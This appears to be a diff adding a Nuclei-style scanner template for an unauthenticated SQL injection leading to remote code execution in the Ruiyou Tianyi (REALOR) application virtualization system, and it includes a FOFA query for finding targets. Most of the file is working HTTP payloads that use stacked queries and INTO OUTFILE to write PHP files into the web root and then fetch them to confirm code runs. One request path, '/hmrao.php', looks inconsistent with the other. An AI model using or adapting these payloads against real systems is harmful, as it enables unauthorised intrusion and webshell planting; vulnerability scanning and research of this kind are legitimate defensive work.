@@ -1,0 +1,45 @@
+id: ruiyoutianyi-sql-RCE
+
+info:
+  name: "瑞友天翼应用虚拟化系统appsave-appdel接口SQL注入远程代码执行"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="REALOR-天翼应用虚拟化系统"
+      瑞友天翼应用虚拟化系统 \Home\Controller\AdminController 控制器中 appsave/appdel 接口未实施身份验证机制，存在SQL注入安全缺陷。攻击者可通过利用PHP PDO堆叠查询机制，向目标系统写入恶意文件，最终实现远程代码执行。该漏洞利用链涉及数据库注入与Web路径写入的组合攻击模式，需构造特定SQL payload触发漏洞。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/139885924
+  tags: 瑞友天翼
+
+http:
+- raw:
+  - |
+    GET /index.php?s=/Admin/appsave&appid=3%27%29%3Bselect+unhex%28%273c3f706870206563686f206d643528223122293b202466696c65203d205f5f46494c455f5f3b20756e6c696e6b282466696c65293b%27%29+into+outfile+%27.%5C%5C..%5C%5C..%5C%5CWebRoot%5C%5Cplom.xgi%27%23 HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /hmrao.php?s=/Admin/appsave&appid=1%27%29%3Bselect%200x3c3f70687020706870696e666f28293b3f3e%20into%20outfile+%27.%5C%5C..%5C%5C..%5C%5CWebRoot%5C%5Cqwe.xgi%27%23 HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /plom.xgi HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /qwe.xgi HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'c4ca4238a0b923820dcc509a6f75849b'
+    - 'phpinfo()'
+    - 'PHP Version'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
+
